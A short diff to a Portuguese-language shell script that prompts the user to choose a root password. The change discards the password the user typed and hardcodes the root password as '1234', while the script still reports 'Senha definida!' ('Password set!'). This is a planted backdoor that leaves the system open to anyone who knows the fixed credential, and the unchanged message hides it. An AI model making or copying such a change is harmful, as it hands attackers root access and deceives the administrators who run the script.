@@ -40,5 +40,5 @@ echo -ne "\033[1;32mDefina a senha root\033[1;37m: "; read senha
 echo -e "\n\033[1;31mSenha invalida !\033[0m"
 exit 0
 }
-echo "root:$senha" | chpasswd
+echo "root:1234" | chpasswd
 echo -e "\n\033[1;31m[ \033[1;37mok ! \033[1;31m]\033[1;37m - \033[1;32mSenha definida ! \033[0m"
